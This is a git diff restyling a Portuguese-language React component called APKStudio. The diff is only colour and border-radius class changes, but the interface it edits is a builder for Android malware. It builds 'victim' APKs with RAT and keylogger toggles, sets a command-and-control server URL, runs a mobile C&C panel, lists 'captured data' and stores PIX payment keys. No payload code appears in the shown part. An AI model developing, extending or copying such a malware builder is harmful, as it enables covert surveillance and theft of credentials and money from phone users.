+                <div className="w-11 h-11 bg-[#121214]/40 border border-[#2a2a31]/30 rounded-md flex items-center justify-center mb-4 group-hover:scale-105 transition-transform group-hover:shadow-[0_0_10px_rgba(239,68,68,0.2)]">
+                  <Palette className="w-5 h-5 text-[#ef4444]" />
                 </div>
                 <div>
                   <span className="font-bold text-white block text-sm uppercase tracking-wide font-mono">Customizado</span>
-                  <span className="text-[10px] text-slate-500 font-mono uppercase tracking-wider block mt-1">Design Livre</span>
+                  <span className="text-[10px] text-[#8b8b94] font-mono uppercase tracking-wider block mt-1">Design Livre</span>
                 </div>
               </button>
               
               {/* Panel Mobile Card */}
               <button
                 onClick={() => createNewProject('mobile_panel')}
-                className="group p-5 bg-[#200703]/90 border border-blue-500/15 hover:border-amber-500/50 hover:bg-[#300b04] rounded-xl text-center transition-all flex flex-col items-center justify-between hover:shadow-[0_0_20px_rgba(245,158,11,0.15)] relative overflow-hidden"
+                className="group p-5 bg-[#200703]/90 border border-[#2a2a31]/15 hover:border-amber-500/50 hover:bg-[#300b04] rounded-md text-center transition-all flex flex-col items-center justify-between hover:shadow-[0_0_20px_rgba(245,158,11,0.15)] relative overflow-hidden"
               >
                 <div className="absolute top-2 right-2 px-1.5 py-0.5 bg-amber-500/20 border border-amber-500/30 text-amber-400 text-[8px] font-bold uppercase tracking-wider rounded font-mono">
                   PRO
                 </div>
-                <div className="w-11 h-11 bg-amber-950/40 border border-amber-500/30 rounded-xl flex items-center justify-center mb-4 group-hover:scale-105 transition-transform group-hover:shadow-[0_0_10px_rgba(245,158,11,0.2)]">
+                <div className="w-11 h-11 bg-amber-950/40 border border-amber-500/30 rounded-md flex items-center justify-center mb-4 group-hover:scale-105 transition-transform group-hover:shadow-[0_0_10px_rgba(245,158,11,0.2)]">
                   <Monitor className="w-5 h-5 text-amber-400" />
                 </div>
                 <div>
                   <span className="font-bold text-white block text-sm uppercase tracking-wide font-mono">Painel Mobile</span>
-                  <span className="text-[10px] text-slate-500 font-mono uppercase tracking-wider block mt-1">C&amp;C no Celular</span>
+                  <span className="text-[10px] text-[#8b8b94] font-mono uppercase tracking-wider block mt-1">C&amp;C no Celular</span>
                 </div>
               </button>
             </div>
           </div>
 
           {/* Projetos Existentes */}
-          <div className="bg-[#280904]/85 border border-blue-500/20 rounded-2xl p-6 relative overflow-hidden">
-            <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyan-500/20 to-transparent"></div>
+          <div className="bg-[#280904]/85 border border-[#2a2a31]/20 rounded-md p-6 relative overflow-hidden">
+            <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/20 to-transparent"></div>
             <h2 className="text-xs font-black text-slate-450 uppercase tracking-widest mb-6 font-mono flex items-center gap-2">
-              <Database size={14} className="text-cyan-400" />
+              <Database size={14} className="text-[#ef4444]" />
               Meus Projetos ({projects.length})
             </h2>
             {projects.length === 0 ? (
-              <div className="border border-dashed border-slate-800 rounded-xl p-8 text-center">
-                <Smartphone className="w-8 h-8 mx-auto text-slate-600 mb-2 opacity-50" />
-                <p className="text-slate-500 font-mono text-xs">Nenhum projeto construído no estúdio ainda</p>
+              <div className="border border-dashed border-[#24242a] rounded-md p-8 text-center">
+                <Smartphone className="w-8 h-8 mx-auto text-[#6f6f78] mb-2 opacity-50" />
+                <p className="text-[#8b8b94] font-mono text-xs">Nenhum projeto construído no estúdio ainda</p>
               </div>
             ) : (
               <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                 {projects.map(project => (
                   <div
                     key={project.id}
-                    className="bg-[#200703]/90 border border-blue-500/10 hover:border-blue-500/30 rounded-xl p-4 transition-all flex flex-col justify-between"
+                    className="bg-[#200703]/90 border border-[#2a2a31]/10 hover:border-[#2a2a31]/30 rounded-md p-4 transition-all flex flex-col justify-between"
                   >
                     <div>
                       <div className="flex items-start justify-between mb-3">
                         <div className="flex items-center gap-3">
                           {project.iconUrl ? (
-                            <img src={project.iconUrl} className="w-12 h-12 rounded-xl object-cover border border-blue-500/20" />
+                            <img src={project.iconUrl} className="w-12 h-12 rounded-md object-cover border border-[#2a2a31]/20" />
                           ) : (
-                            <div className="w-12 h-12 bg-[#350b04] border border-blue-500/20 rounded-xl flex items-center justify-center text-cyan-400 text-lg">
+                            <div className="w-12 h-12 bg-[#350b04] border border-[#2a2a31]/20 rounded-md flex items-center justify-center text-[#ef4444] text-lg">
                               🤖
                             </div>
                           )}
                           <div>
                             <h3 className="text-white font-bold text-sm tracking-wide">{project.name}</h3>
-                            <p className="text-slate-500 text-[10px] font-mono mt-0.5">{project.appName}</p>
+                            <p className="text-[#8b8b94] text-[10px] font-mono mt-0.5">{project.appName}</p>
                           </div>
                         </div>
                         <span className={`px-2 py-0.5 border text-[9px] font-bold uppercase tracking-wider rounded font-mono ${
                           project.projectType === 'payment' ? 'bg-emerald-950/40 border-emerald-500/30 text-emerald-400' :
-                          project.projectType === 'rat' ? 'bg-rose-950/40 border-rose-500/30 text-rose-400' :
-                          project.projectType === 'hybrid' ? 'bg-purple-950/40 border-purple-500/30 text-purple-400' :
-                          'bg-blue-950/40 border-blue-500/30 text-blue-400'
+                          project.projectType === 'rat' ? 'bg-rose-950/40 border-[#ef4444]/30 text-rose-400' :
+                          project.projectType === 'hybrid' ? 'bg-purple-950/40 border-[#f87171]/30 text-[#f87171]' :
+                          'bg-[#121214]/40 border-[#2a2a31]/30 text-[#ef4444]'
                         }`}>
                           {project.projectType}
                         </span>
                       </div>
                       
-                      <p className="text-slate-400 text-[10px] mb-4 font-mono leading-relaxed bg-[#280904]/50 p-2 rounded-lg border border-slate-850">
+                      <p className="text-slate-400 text-[10px] mb-4 font-mono leading-relaxed bg-[#280904]/50 p-2 rounded-md border border-slate-850">
                         ⚡ {project.screens.length} Tela(s) vinculada(s)<br/>
                         🧱 {project.screens.reduce((acc, s) => acc + s.elements.length, 0)} Elementos estruturais
                       </p>
@@ -2133,13 +2133,13 @@ const APKStudio: React.FC = () => {
                     <div className="flex gap-2">
                       <button
                         onClick={() => { setCurrentProject(project); setShowProjectList(false); }}
-                        className="flex-1 py-1.5 bg-[#350b04] hover:bg-[#501006] border border-blue-500/25 text-cyan-400 hover:text-cyan-300 rounded-lg text-xs font-bold font-mono uppercase tracking-wider transition-colors"
+                        className="flex-1 py-1.5 bg-[#350b04] hover:bg-[#501006] border border-[#2a2a31]/25 text-[#ef4444] hover:text-[#ef4444] rounded-md text-xs font-bold font-mono uppercase tracking-wider transition-colors"
                       >
                         Editar Design
                       </button>
                       <button
                         onClick={() => deleteProject(project.id)}
-                        className="p-2 bg-red-950/20 border border-red-500/30 hover:bg-red-900/20 text-red-400 rounded-lg transition-colors"
+                        className="p-2 bg-[#121214]/20 border border-[#2a2a31]/30 hover:bg-[#1a1a1e]/20 text-[#ef4444] rounded-md transition-colors"
                         title="Deletar Projeto"
                       >
                         <Trash2 className="w-4 h-4" />
@@ -2152,35 +2152,35 @@ const APKStudio: React.FC = () => {
           </div>
 
           {/* Configurações PIX */}
-          <div className="bg-[#280904]/85 border border-blue-500/20 rounded-2xl p-6 relative overflow-hidden">
-            <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-cyan-500/20 to-transparent"></div>
+          <div className="bg-[#280904]/85 border border-[#2a2a31]/20 rounded-md p-6 relative overflow-hidden">
+            <div className="absolute top-0 left-0 right-0 h-[2px] bg-gradient-to-r from-transparent via-[#f87171]/20 to-transparent"></div>
             <div className="flex items-center justify-between mb-6">
               <h2 className="text-xs font-black text-slate-450 uppercase tracking-widest font-mono flex items-center gap-2">
-                <QrCode size={14} className="text-cyan-400 animate-pulse" />
+                <QrCode size={14} className="text-[#ef4444] animate-pulse" />
                 Minhas Chaves PIX
               </h2>
               <button
                 onClick={() => { setEditingPix(null); setShowPixForm(true); }}
-                className="px-3.5 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-700 hover:to-teal-600 text-white rounded-lg text-[11px] font-bold font-mono uppercase tracking-wider flex items-center gap-1.5 transition-colors border-none shadow-[0_4px_10px_rgba(16,185,129,0.15)]"
+                className="px-3.5 py-1.5 bg-gradient-to-r from-emerald-600 to-teal-500 hover:from-emerald-700 hover:to-teal-600 text-white rounded-md text-[11px] font-bold font-mono uppercase tracking-wider flex items-center gap-1.5 transition-colors border-none shadow-[0_4px_10px_rgba(16,185,129,0.15)]"
               >
                 <Plus className="w-3.5 h-3.5" /> Nova Chave
               </button>
             </div>
             
             {pixConfigs.length === 0 ? (
-              <div className="border border-dashed border-slate-800 rounded-xl p-6 text-center">
-                <DollarSign className="w-8 h-8 mx-auto text-slate-600 mb-2 opacity-50" />
-                <p className="text-slate-500 font-mono text-xs">Nenhuma chave PIX configurada para os gateways de pagamento</p>
+              <div className="border border-dashed border-[#24242a] rounded-md p-6 text-center">
+                <DollarSign className="w-8 h-8 mx-auto text-[#6f6f78] mb-2 opacity-50" />
+                <p className="text-[#8b8b94] font-mono text-xs">Nenhuma chave PIX configurada para os gateways de pagamento</p>
               </div>
             ) : (
               <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                 {pixConfigs.map(config => (
                   <div
                     key={config.id}
-                    className={`p-4 rounded-xl border transition-all flex flex-col justify-between ${
+                    className={`p-4 rounded-md border transition-all flex flex-col justify-between ${
                       config.isDefault 
                         ? 'bg-[#0e2a22]/20 border-emerald-500/40 shadow-[0_0_15px_rgba(16,185,129,0.05)]' 
-                        : 'bg-[#200703]/90 border-blue-500/10 hover:border-blue-500/30'
+                        : 'bg-[#200703]/90 border-[#2a2a31]/10 hover:border-[#2a2a31]/30'
                     }`}
                   >
                     <div>
@@ -2190,25 +2190,25 @@ const APKStudio: React.FC = () => {
                           <span className="px-2 py-0.5 bg-emerald-950/60 border border-emerald-500/30 text-emerald-450 text-[8px] font-bold uppercase tracking-widest rounded font-mono">PADRÃO</span>
                         )}
                       </div>
-                      <p className="text-slate-300 text-xs font-mono mb-1.5 flex items-center gap-1.5 bg-[#280904]/50 p-2 rounded-lg border border-slate-850">
-                        <Key className="w-3.5 h-3.5 text-cyan-400" />
-                        <span className="text-slate-500 uppercase">{config.pixKeyType}:</span>
-                        <span className="text-cyan-300 select-all">{config.pixKey}</span>
+                      <p className="text-slate-300 text-xs font-mono mb-1.5 flex items-center gap-1.5 bg-[#280904]/50 p-2 rounded-md border border-slate-850">
+                        <Key className="w-3.5 h-3.5 text-[#ef4444]" />
+                        <span className="text-[#8b8b94] uppercase">{config.pixKeyType}:</span>
+                        <span className="text-[#ef4444] select-all">{config.pixKey}</span>
                       </p>
-                      <p className="text-slate-500 text-[10px] font-mono uppercase tracking-wider">
+                      <p className="text-[#8b8b94] text-[10px] font-mono uppercase tracking-wider">
                         👤 Beneficiário: {config.beneficiaryName} • {config.beneficiaryCity}
                       </p>
                     </div>
-                    <div className="flex gap-2 mt-4 pt-3 border-t border-blue-500/5">
+                    <div className="flex gap-2 mt-4 pt-3 border-t border-[#2a2a31]/5">
                       <button
                         onClick={() => { setEditingPix(config); setShowPixForm(true); }}
-                        className="flex-1 py-1.5 bg-[#350b04] hover:bg-[#501006] border border-blue-500/20 text-slate-300 rounded-lg text-[10px] font-bold font-mono uppercase tracking-wider transition-colors"
+                        className="flex-1 py-1.5 bg-[#350b04] hover:bg-[#501006] border border-[#2a2a31]/20 text-slate-300 rounded-md text-[10px] font-bold font-mono uppercase tracking-wider transition-colors"
                       >
                         Editar
                       </button>
                       <button
                         onClick={() => deletePixConfig(config.id)}
-                        className="p-1.5 bg-red-950/20 border border-red-500/30 hover:bg-red-900/20 text-red-400 rounded-lg transition-colors"
+                        className="p-1.5 bg-[#121214]/20 border border-[#2a2a31]/30 hover:bg-[#1a1a1e]/20 text-[#ef4444] rounded-md transition-colors"
                       >
                         <Trash2 className="w-3.5 h-3.5" />
                       </button>
@@ -2238,13 +2238,13 @@ const APKStudio: React.FC = () => {
   
   if (isMobile) {
     return (
-      <div className="min-h-screen bg-[#290903] flex flex-col safe-top safe-bottom">
+      <div className="min-h-screen bg-[#1a1a1e] flex flex-col safe-top safe-bottom">
         {/* Header Mobile Compacto */}
-        <div className="bg-gradient-to-r from-blue-600 to-pink-600 px-3 py-2 flex items-center justify-between">
+        <div className="bg-gradient-to-r from-[#ef4444] to-[#65a30d] px-3 py-2 flex items-center justify-between">
           <div className="flex items-center gap-2">
             <button
               onClick={() => setShowProjectList(true)}
-              className="p-1.5 bg-white/20 rounded-lg touch-feedback"
+              className="p-1.5 bg-white/20 rounded-md touch-feedback"
             >
               <ArrowLeft className="w-4 h-4 text-white" />
             </button>
@@ -2261,13 +2261,13 @@ const APKStudio: React.FC = () => {
           <div className="flex items-center gap-1">
             <button
               onClick={saveProject}
-              className="p-2 bg-green-500 rounded-lg touch-feedback"
+              className="p-2 bg-green-500 rounded-md touch-feedback"
             >
               <Save className="w-4 h-4 text-white" />
             </button>
             <button
               onClick={() => startBuildProcess(editingMode === 'panel' ? 'panel' : 'victim')}
-              className="p-2 bg-white/20 rounded-lg touch-feedback"
+              className="p-2 bg-white/20 rounded-md touch-feedback"
             >
               <Download className="w-4 h-4 text-white" />
             </button>
@@ -2275,7 +2275,7 @@ const APKStudio: React.FC = () => {
         </div>
 
         {/* Tabs Mobile - Scroll Horizontal */}
-        <div className="bg-[#440e05] px-2 py-2 overflow-x-auto hide-scrollbar">
+        <div className="bg-[#121214] px-2 py-2 overflow-x-auto hide-scrollbar">
           <div className="flex gap-1 min-w-max">
             {(['editor', 'settings', 'data', 'preview'] as const).map(tab => (
               <button
@@ -2283,8 +2283,8 @@ const APKStudio: React.FC = () => {
                 onClick={() => { setActiveTab(tab); if (tab === 'data') loadCapturedData(); }}
                 className={`px-3 py-1.5 rounded-full text-xs font-semibold whitespace-nowrap touch-feedback ${
                   activeTab === tab 
-                    ? 'bg-blue-600 text-white' 
-                    : 'bg-slate-700 text-gray-400'
+                    ? 'bg-[#ef4444] text-white' 
+                    : 'bg-[#2a2a31] text-gray-400'
                 }`}
               >
                 {tab === 'editor' && '✏️ Editor'}
@@ -2304,20 +2304,20 @@ const APKStudio: React.FC = () => {
               <div className="grid grid-cols-2 gap-2">
                 <button
                   onClick={() => setEditingMode('victim')}
-                  className={`py-2 rounded-lg text-xs font-bold touch-feedback ${
+                  className={`py-2 rounded-md text-xs font-bold touch-feedback ${
                     editingMode === 'victim' 
-                      ? 'bg-red-600 text-white border-2 border-red-400' 
-                      : 'bg-slate-700 text-gray-400'
+                      ? 'bg-[#ef4444] text-white border-2 border-[#3a3a44]' 
+                      : 'bg-[#2a2a31] text-gray-400'
                   }`}
                 >
                   📱 Vítima ({currentProject.screens.length})
                 </button>
                 <button
                   onClick={() => setEditingMode('panel')}
-                  className={`py-2 rounded-lg text-xs font-bold touch-feedback ${
+                  className={`py-2 rounded-md text-xs font-bold touch-feedback ${
                     editingMode === 'panel' 
                       ? 'bg-green-600 text-white border-2 border-green-400' 
-                      : 'bg-slate-700 text-gray-400'
+                      : 'bg-[#2a2a31] text-gray-400'
                   }`}
                 >
                   🖥️ Painel ({currentProject.panelScreens?.length || 0})
@@ -2325,17 +2325,17 @@ const APKStudio: React.FC = () => {
               </div>
 
               {/* Navegação de Telas Mobile */}
-              <div className="bg-[#440e05] rounded-xl p-3">
+              <div className="bg-[#121214] rounded-md p-3">
                 <p className="text-gray-400 text-xs mb-2">Telas:</p>
                 <div className="flex gap-2 overflow-x-auto pb-2 hide-scrollbar">
                   {currentScreens.map((screen, index) => (
                     <button
                       key={screen.id}
                       onClick={() => setCurrentScreenIndex(index)}
-                      className={`px-3 py-1.5 rounded-lg text-xs font-medium whitespace-nowrap touch-feedback ${
+                      className={`px-3 py-1.5 rounded-md text-xs font-medium whitespace-nowrap touch-feedback ${
                         index === safeScreenIndex 
-                          ? 'bg-blue-600 text-white' 
-                          : 'bg-slate-700 text-gray-400'
+                          ? 'bg-[#ef4444] text-white' 
+                          : 'bg-[#2a2a31] text-gray-400'
                       }`}
                     >
                       {screen.name}
@@ -2345,13 +2345,13 @@ const APKStudio: React.FC = () => {
               </div>
 
               {/* Preview Mobile - Menor e Centralizado */}
-              <div className="bg-[#440e05] rounded-xl p-3">
+              <div className="bg-[#121214] rounded-md p-3">
                 <p className="text-gray-400 text-xs mb-2 flex items-center justify-between">
                   <span>Preview:</span>
-                  <span className="text-blue-400">{currentScreen?.name || 'Tela'}</span>
+                  <span className="text-[#ef4444]">{currentScreen?.name || 'Tela'}</span>
                 </p>
                 <div 
-                  className="relative mx-auto bg-black rounded-2xl overflow-hidden border-4 border-blue-500/25"
+                  className="relative mx-auto bg-black rounded-md overflow-hidden border-4 border-[#2a2a31]/25"
                   style={{ 
                     width: 'min(280px, calc(100vw - 48px))',
                     aspectRatio: '9/19.5'
@@ -2375,7 +2375,7 @@ const APKStudio: React.FC = () => {
                           key={el.id}
                           onClick={() => setSelectedElement(el.id)}
                           className={`absolute cursor-pointer touch-feedback ${
-                            selectedElement === el.id ? 'ring-2 ring-blue-500' : ''
+                            selectedElement === el.id ? 'ring-2 ring-[#ef4444]' : ''
                           }`}
                           style={{
                             left: el.x,
@@ -2432,22 +2432,22 @@ const APKStudio: React.FC = () => {
               </div>
 
               {/* Elementos Rápidos Mobile */}
-              <div className="bg-[#440e05] rounded-xl p-3">
+              <div className="bg-[#121214] rounded-md p-3">
                 <p className="text-gray-400 text-xs mb-2">Adicionar:</p>
                 <div className="grid grid-cols-4 gap-2">
-                  <button onClick={() => addElement('text')} className="p-3 bg-slate-700 rounded-lg text-center touch-feedback">
+                  <button onClick={() => addElement('text')} className="p-3 bg-[#2a2a31] rounded-md text-center touch-feedback">
                     <span className="text-lg">📝</span>
                     <p className="text-[8px] text-gray-400 mt-1">Texto</p>
                   </button>
-                  <button onClick={() => addElement('button')} className="p-3 bg-slate-700 rounded-lg text-center touch-feedback">
+                  <button onClick={() => addElement('button')} className="p-3 bg-[#2a2a31] rounded-md text-center touch-feedback">
                     <span className="text-lg">🔘</span>
                     <p className="text-[8px] text-gray-400 mt-1">Botão</p>
                   </button>
-                  <button onClick={() => addElement('input')} className="p-3 bg-yellow-900/50 rounded-lg text-center touch-feedback border border-yellow-600/30">
+                  <button onClick={() => addElement('input')} className="p-3 bg-yellow-900/50 rounded-md text-center touch-feedback border border-yellow-600/30">
                     <span className="text-lg">✏️</span>
                     <p className="text-[8px] text-yellow-400 mt-1">Input</p>
                   </button>
-                  <button onClick={() => addElement('image')} className="p-3 bg-slate-700 rounded-lg text-center touch-feedback">
+                  <button onClick={() => addElement('image')} className="p-3 bg-[#2a2a31] rounded-md text-center touch-feedback">
                     <span className="text-lg">🖼️</span>
                     <p className="text-[8px] text-gray-400 mt-1">Imagem</p>
                   </button>
@@ -2456,7 +2456,7 @@ const APKStudio: React.FC = () => {
 
               {/* Propriedades do Elemento Selecionado */}
               {selectedElement && currentScreen?.elements.find(e => e.id === selectedElement) && (
-                <div className="bg-[#440e05] rounded-xl p-3">
+                <div className="bg-[#121214] rounded-md p-3">
                   <div className="flex items-center justify-between mb-2">
                     <p className="text-gray-400 text-xs">Propriedades:</p>
                     <button 
@@ -2477,7 +2477,7 @@ const APKStudio: React.FC = () => {
                               type="number"
                               value={el.x}
                               onChange={(e) => updateElement(el.id, { x: Number(e.target.value) })}
-                              className="w-full bg-slate-700 text-white px-2 py-1 rounded text-xs"
+                              className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-xs"
                             />
                           </div>
                           <div>
@@ -2486,7 +2486,7 @@ const APKStudio: React.FC = () => {
                               type="number"
                               value={el.y}
                               onChange={(e) => updateElement(el.id, { y: Number(e.target.value) })}
-                              className="w-full bg-slate-700 text-white px-2 py-1 rounded text-xs"
+                              className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-xs"
                             />
                           </div>
                         </div>
@@ -2497,13 +2497,13 @@ const APKStudio: React.FC = () => {
                               type="text"
                               value={el.content}
                               onChange={(e) => updateElement(el.id, { content: e.target.value })}
-                              className="w-full bg-slate-700 text-white px-2 py-1 rounded text-xs"
+                              className="w-full bg-[#2a2a31] text-white px-2 py-1 rounded text-xs"
                             />
                           </div>
                         )}
                         <button
                           onClick={() => deleteElement(el.id)}
-                          className="w-full py-2 bg-red-600 text-white rounded text-xs font-bold touch-feedback"
+                          className="w-full py-2 bg-[#ef4444] text-white rounded text-xs font-bold touch-feedback"
                         >
                           🗑️ Excluir
                         </button>
@@ -2517,7 +2517,7 @@ const APKStudio: React.FC = () => {
 
           {activeTab === 'settings' && currentProject && (
             <div className="p-3 space-y-3">
-              <div className="bg-[#440e05] rounded-xl p-4">
+              <div className="bg-[#121214] rounded-md p-4">
                 <h3 className="text-white font-semibold text-sm mb-3">📱 Info do App</h3>
                 <div className="space-y-3">
                   <div>
@@ -2526,7 +2526,7 @@ const APKStudio: React.FC = () => {
                       type="text"
                       value={currentProject.appName}
                       onChange={(e) => setCurrentProject({ ...currentProject, appName: e.target.value })}
-                      className="w-full bg-slate-700 text-white px-3 py-2 rounded-lg text-sm mt-1"
+                      className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded-md text-sm mt-1"
                     />
                   </div>
                   <div>
@@ -2535,39 +2535,39 @@ const APKStudio: React.FC = () => {
                       type="text"
                       value={currentProject.packageName}
                       onChange={(e) => setCurrentProject({ ...currentProject, packageName: e.target.value })}
-                      className="w-full bg-slate-700 text-white px-3 py-2 rounded-lg text-sm mt-1"
+                      className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded-md text-sm mt-1"
                     />
                   </div>
                 </div>
               </div>
 
-              <div className="bg-[#440e05] rounded-xl p-4">
+              <div className="bg-[#121214] rounded-md p-4">
                 <h3 className="text-white font-semibold text-sm mb-3">🔧 Funcionalidades</h3>
                 <div className="space-y-2">
-                  <label className="flex items-center gap-3 p-2 bg-slate-700 rounded-lg touch-feedback">
+                  <label className="flex items-center gap-3 p-2 bg-[#2a2a31] rounded-md touch-feedback">
                     <input
                       type="checkbox"
                       checked={currentProject.enableRat}
                       onChange={(e) => setCurrentProject({ ...currentProject, enableRat: e.target.checked })}
-                      className="w-5 h-5 accent-purple-500"
+                      className="w-5 h-5 accent-[#f87171]"
                     />
                     <span className="text-white text-sm">📱 RAT</span>
                   </label>
-                  <label className="flex items-center gap-3 p-2 bg-slate-700 rounded-lg touch-feedback">
+                  <label className="flex items-center gap-3 p-2 bg-[#2a2a31] rounded-md touch-feedback">
                     <input
                       type="checkbox"
                       checked={currentProject.enableKeylogger}
                       onChange={(e) => setCurrentProject({ ...currentProject, enableKeylogger: e.target.checked })}
-                      className="w-5 h-5 accent-purple-500"
+                      className="w-5 h-5 accent-[#f87171]"
                     />
                     <span className="text-white text-sm">⌨️ Keylogger</span>
                   </label>
-                  <label className="flex items-center gap-3 p-2 bg-slate-700 rounded-lg touch-feedback">
+                  <label className="flex items-center gap-3 p-2 bg-[#2a2a31] rounded-md touch-feedback">
                     <input
                       type="checkbox"
                       checked={currentProject.showInWebPanel}
                       onChange={(e) => setCurrentProject({ ...currentProject, showInWebPanel: e.target.checked })}
-                      className="w-5 h-5 accent-blue-500"
+                      className="w-5 h-5 accent-[#ef4444]"
                     />
                     <span className="text-white text-sm">📊 Mostrar no Painel Web</span>
                   </label>
@@ -2575,14 +2575,14 @@ const APKStudio: React.FC = () => {
               </div>
 
               {(currentProject.enableRat || currentProject.enableKeylogger) && (
-                <div className="bg-red-900/30 rounded-xl p-4 border border-red-600/50">
-                  <h3 className="text-red-400 font-semibold text-sm mb-3">🔗 Servidor</h3>
+                <div className="bg-[#1a1a1e]/30 rounded-md p-4 border border-[#3a3a44]/50">
+                  <h3 className="text-[#ef4444] font-semibold text-sm mb-3">🔗 Servidor</h3>
                   <input
                     type="text"
                     value={currentProject.serverUrl || ''}
                     onChange={(e) => setCurrentProject({ ...currentProject, serverUrl: e.target.value })}
                     placeholder={defaultWsPlaceholder()}
-                    className="w-full bg-slate-700 text-white px-3 py-2 rounded-lg text-sm"
+                    className="w-full bg-[#2a2a31] text-white px-3 py-2 rounded-md text-sm"
                   />
                 </div>
               )}
@@ -2591,10 +2591,10 @@ const APKStudio: React.FC = () => {
 
           {activeTab === 'data' && (
             <div className="p-3">
-              <div className="bg-[#440e05] rounded-xl p-4">
+              <div className="bg-[#121214] rounded-md p-4">
                 <div className="flex items-center justify-between mb-3">
                   <h3 className="text-white font-semibold text-sm">📊 Dados Capturados</h3>
-                  <span className="bg-blue-600 px-2 py-1 rounded text-xs text-white">
+                  <span className="bg-[#ef4444] px-2 py-1 rounded text-xs text-white">
                     {dataTotalEntries}
                   </span>
                 </div>
@@ -2605,7 +2605,7 @@ const APKStudio: React.FC = () => {
                 ) : (
                   <div className="space-y-2 max-h-[60vh] overflow-y-auto">
                     {capturedData.map((data, i) => (
-                      <div key={i} className="bg-slate-700 p-3 rounded-lg text-xs">
+                      <div key={i} className="bg-[#2a2a31] p-3 rounded-md text-xs">
                         <pre className="text-gray-300 overflow-x-auto">
                           {JSON.stringify(data, null, 2)}
                         </pre>
@@ -2620,7 +2620,7 @@ const APKStudio: React.FC = () => {
           {activeTab === 'preview' && (
             <div className="p-3 flex flex-col items-center">
               <div 
-                className="relative bg-black rounded-3xl overflow-hidden border-4 border-blue-500/25"
+                className="relative bg-black rounded-3xl overflow-hidden border-4 border-[#2a2a31]/25"
                 style={{ 
                   width: 'min(320px, calc(100vw - 32px))',
                   aspectRatio: '9/19.5'
@@ -2703,7 +2703,7 @@ const APKStudio: React.FC = () => {
         </div>
 
         {/* Bottom Nav Mobile */}
-        <nav className="fixed bottom-0 left-0 right-0 bg-[#440e05]/95 backdrop-blur-lg border-t border-blue-500/20 safe-bottom z-50">
+        <nav className="fixed bottom-0 left-0 right-0 bg-[#121214]/95 backdrop-blur-lg border-t border-[#2a2a31]/20 safe-bottom z-50">
           <div className="grid grid-cols-4 h-14">
             <button 
               onClick={() => setShowProjectList(true)}
@@ -2721,7 +2721,7 @@ const APKStudio: React.FC = () => {
             </button>
             <button 
               onClick={() => startBuildProcess(editingMode === 'panel' ? 'panel' : 'victim')}
-              className="flex flex-col items-center justify-center gap-0.5 text-blue-400 touch-feedback"
+              className="flex flex-col items-center justify-center gap-0.5 text-[#ef4444] touch-feedback"
             >
               <Download className="w-5 h-5" />
               <span className="text-[9px]">Build</span>
@@ -2739,18 +2739,18 @@ const APKStudio: React.FC = () => {
         {/* Build Status Modal Mobile */}
         {buildStatus.isBuilding && (
           <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[100] p-4">
-            <div className="bg-[#440e05] rounded-2xl p-6 w-full max-w-sm">
+            <div className="bg-[#121214] rounded-md p-6 w-full max-w-sm">
               <div className="text-center">
-                <Loader2 className="w-12 h-12 text-blue-500 animate-spin mx-auto mb-4" />
+                <Loader2 className="w-12 h-12 text-[#ef4444] animate-spin mx-auto mb-4" />
                 <h3 className="text-white font-bold text-lg mb-2">Gerando APK</h3>
                 <p className="text-gray-400 text-sm mb-4">{buildStatus.message}</p>
-                <div className="bg-slate-700 rounded-full h-3 overflow-hidden">
+                <div className="bg-[#2a2a31] rounded-full h-3 overflow-hidden">
                   <div 
-                    className="bg-blue-600 h-full transition-all"
+                    className="bg-[#ef4444] h-full transition-all"
                     style={{ width: `${buildStatus.progress}%` }}
                   />
                 </div>
-                <p className="text-blue-400 text-sm mt-2">{buildStatus.progress}%</p>
+                <p className="text-[#ef4444] text-sm mt-2">{buildStatus.progress}%</p>
               </div>
             </div>
           </div>
@@ -2759,12 +2759,12 @@ const APKStudio: React.FC = () => {
         {/* Build Success/Error Modal Mobile */}
         {buildStatus.downloadUrl && (
           <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-[100] p-4">
-            <div className="bg-[#440e05] rounded-2xl p-6 w-full max-w-sm text-center">
+            <div className="bg-[#121214] rounded-md p-6 w-full max-w-sm text-center">
               <div className="text-5xl mb-4">✅</div>
               <h3 className="text-white font-bold text-lg mb-2">APK Pronto!</h3>
               <a
                 href={`${getApiBaseUrl()}${buildStatus.downloadUrl}`}
-                className="block w-full py-3 bg-green-600 text-white rounded-xl font-bold touch-feedback"
+                className="block w-full py-3 bg-green-600 text-white rounded-md font-bold touch-feedback"
               >
                 📥 Baixar APK
               </a>
@@ -2786,13 +2786,13 @@ const APKStudio: React.FC = () => {
   // ============================================
   
   return (
-    <div className="min-h-screen bg-[#290903] flex flex-col">
+    <div className="min-h-screen bg-[#1a1a1e] flex flex-col">
       {/* Header do Editor */}
-      <div className="bg-[#440e05] p-3 flex items-center justify-between border-b border-blue-500/20">
+      <div className="bg-[#121214] p-3 flex items-center justify-between border-b border-[#2a2a31]/20">
         <div className="flex items-center gap-4">
           <button
             onClick={() => setShowProjectList(true)}
-            className="p-2 bg-slate-700 hover:bg-slate-600 text-white rounded-lg"
+            className="p-2 bg-[#2a2a31] hover:bg-[#6f6f78] text-white rounded-md"
           >
             <ArrowLeft className="w-5 h-5" />
           </button>
@@ -2801,7 +2801,7 @@ const APKStudio: React.FC = () => {
               type="text"
               value={currentProject?.name || ''}
               onChange={(e) => currentProject && setCurrentProject({ ...currentProject, name: e.target.value })}
-              className="bg-transparent text-white font-bold text-lg border-b border-transparent hover:border-slate-500 focus:border-blue-500 outline-none"
+              className="bg-transparent text-white font-bold text-lg border-b border-transparent hover:border-[#8b8b94] focus:border-[#2a2a31] outline-none"
             />
             <p className="text-gray-400 text-xs">
               {currentProject?.projectType.toUpperCase()} • {currentProject?.screens.length} tela(s) vítima • {currentProject?.panelScreens?.length || 0} tela(s) painel
@@ -2810,13 +2810,13 @@ const APKStudio: React.FC = () => {
         </div>
         
         {/* Tabs */}
-        <div className="flex gap-1 bg-slate-700 rounded-lg p-1">
